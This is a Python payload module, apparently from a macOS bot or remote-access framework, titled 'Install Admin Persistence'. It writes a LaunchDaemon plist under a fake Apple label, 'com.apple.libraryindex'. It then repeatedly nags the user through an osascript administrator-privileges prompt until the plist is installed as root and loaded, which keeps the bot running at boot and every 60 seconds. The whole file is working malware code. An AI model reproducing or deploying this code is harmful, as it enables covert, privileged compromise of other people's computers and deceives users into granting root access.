'''
NAME: Install Admin Persistence
DESCRIPTION:  Installs root-level persistence for bot
VAR ITERS=1: Number of ask iterations to nag (0 = infinite)
'''

import os, sys

ITERS = int(ITERS)

script_path = payloadlib.fileloc
python_path = payloadlib.pythonpath

temp_name = '/tmp/tmpdaemon.plist'
perm_name = '/Library/LaunchDaemons/com.apple.libraryindex.plist'

STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
                '<plist version="1.0">' + '\n'
                '<dict>' + '\n'
                '\t' + '<key>Label</key>' + '\n'
                '\t' + '<string>com.apple.libraryindex</string>' + '\n'
                '\t' + '<key>ProgramArguments</key>' + '\n'
                '\t' + '<array>' + '\n'
                '\t\t' + '<string>{python_path}</string>' + '\n'
                '\t\t' + '<string>{script_path}</string>' + '\n'
                '\t' + '</array>' + '\n'
                '\t' + '<key>RunAtLoad</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '\t' + '<key>StartInterval</key>' + '\n'
                '\t' + '<integer>60</integer>' + '\n'
                '\t' + '<key>KeepAlive</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '\t' + '<key>AbandonProcessGroup</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '</dict>' + '\n'
                '</plist>' + '\n').format(python_path=python_path, script_path=script_path)

with open(temp_name,'w') as f:
    f.write(STARTUP_PLIST)

while ITERS != 0:
    code = os.system(("osascript -e 'do shell script "
                      "\"mv {temp} {perm} && "
                      "chown root:admin {perm} && "
                      "chgrp wheel {perm} && "
                      "sudo launchctl load -w {perm}\""
                      "with administrator privileges'").format(temp=temp_name,
                                                               perm=perm_name))
    if code == 0:
        break
    else:
        ITERS -= 1

if ITERS == 0:
    sys.stderr.write("Failed to install\n")
else:
    sys.stdout.write("Install success\n")